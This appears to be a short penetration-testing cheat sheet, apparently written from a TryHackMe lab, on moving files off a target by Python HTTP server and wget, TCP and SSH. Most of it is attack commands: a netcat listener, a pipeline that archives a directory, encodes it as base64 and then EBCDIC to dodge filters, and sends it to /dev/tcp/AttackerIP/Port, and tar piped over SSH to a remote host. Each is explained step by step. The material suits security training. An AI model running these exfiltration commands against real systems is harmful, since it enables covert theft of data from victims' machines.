## Python web server

Attacker computer

```bash
python -m SimpleHTTPServer 80 : use port that is not used  
```

```bash
python3 -m http.Server 80
```

Download from target

```bash
wget http://attackeraddress/filename   
```

## TCP Exfiltration

Attacker Listener

<pre><code><strong>nc -lvnp -port- >  "filename we can set "
</strong></code></pre>

Sending to listener

```bash
tar zcf - directoryName | base 64 | dd conv=ebcdic> /dev/tcp/AttackerIP/Port
```

1️⃣ `tar zcf - directoryName`

* `tar` = archive utility.
* `z` = compress using gzip.
* `c` = create a new archive.
* `f -` = output to **stdout** (instead of a file).
* `directoryName` = the folder being archived.

**Effect:** This creates a compressed archive of `directoryName` and sends it **to stdout**.

***

2️⃣ `| base64`

* `base64` = encodes the binary tar.gz data into **ASCII text**.
* Why? Because sending raw binary over `/dev/tcp` might break if the network path expects text, and ASCII is safer.

***

3️⃣ `| dd conv=ebcdic`

* `dd` = low-level copy/convert tool.
* `conv=ebcdic` = converts the ASCII Base64 output to **EBCDIC encoding**.
* EBCDIC is an old IBM character encoding.
* Often seen in malware/obfuscation to bypass filters or legacy systems.

***

4️⃣ `> /dev/tcp/AttackerIP/Port`

* Bash allows redirecting output to **special TCP device**:
  * `/dev/tcp/IP/PORT` opens a TCP connection to that host and port.
* `>` = send all stdout (the EBCDIC-encoded Base64 archive) **directly to the attacker**.

{% hint style="warning" %}
Essenitly we zip the file we want to transfer.The data we transfer must be the directory
{% endhint %}

After recivied - Decode the data

```
dd conv=ascii if=FileName | base64 -d > FileName
```

Unzip

```bash
tar xvf fileName.tar
```

## SSH Exfiltration

Default

```bash
tar cf - task5/ | ssh user@ip "cd /tmp/; tar xpf -"
```

Custom Port

```bash
tar cf - FolderName/ | ssh -p 2222  user@ip "cd /tmp/; tar xpf -"
```

#### Step-by-step explanation:

1. **`tar cf - task5/`**
   * `tar` is used for creating and extracting archives.
   * `c` → **create** a new archive.
   * `f -` → output to **stdout** (the `-` means “write to standard output” instead of a file).
   * `task5/` → the folder you want to archive.
   * **Result:** a tarball of `task5/` is sent to stdout.
2. **`|` (pipe)**
   * This takes the stdout from the `tar` command (the archive data) and sends it as stdin to the next command.
3. **`ssh thm@jump.thm.com "cd /tmp/; tar xpf -"`**
   * `ssh thm@jump.thm.com` → connects to the remote host `jump.thm.com` as user `thm`.
   * `"cd /tmp/; tar xpf -"` → this is the command executed on the remote machine:
     * `cd /tmp/` → change directory to `/tmp/`.
     * `tar xpf -` → extract the archive received from stdin (`-` means stdin):
       * `x` → extract.
       * `p` → **preserve permissions**.
       * `f -` → read archive from stdin.
